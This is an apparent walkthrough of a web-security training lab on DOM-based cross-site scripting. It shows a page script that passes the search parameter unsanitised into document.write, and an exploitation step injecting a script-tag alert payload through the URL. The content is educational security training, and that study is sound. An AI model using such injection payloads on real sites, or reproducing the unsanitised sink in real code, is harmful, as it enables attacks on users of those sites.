### Lab: DOM XSS in document.write sink using source location.search
#### **Recon:**
-----
**Request:**
```http
GET /?search=some_text HTTP/2
Host: 0bb.web-security-academy.net

...Omitted for Brevety...
```
**Response:**
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3657

...Omitted for Brevety...

<script>
	function trackSearch(query) {
		document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
	}
	var query = (new URLSearchParams(window.location.search)).get('search');
	if(query) {
		trackSearch(query);
	}
</script>
```
`Inspecting the web page content`
```html
...Omitted for Brevety...
<img src="/resources/images/tracker.gif?searchTerms=some_text">
...Omitted for Brevety...
```

**Affected Locations:**
```
https://0bb.web-security-academy.net/?search=
```

```js
document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
```
### Exploitation
----
**Payload**
```js
"><script>alert('xss')</script>
```
**Request:**
```http
GET /?search="><script>alert('xss')</script> HTTP/2
Host: 0bb.web-security-academy.net

...Omitted for Brevety...
```
**Response:**
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3709

...Omitted for Brevety...
```


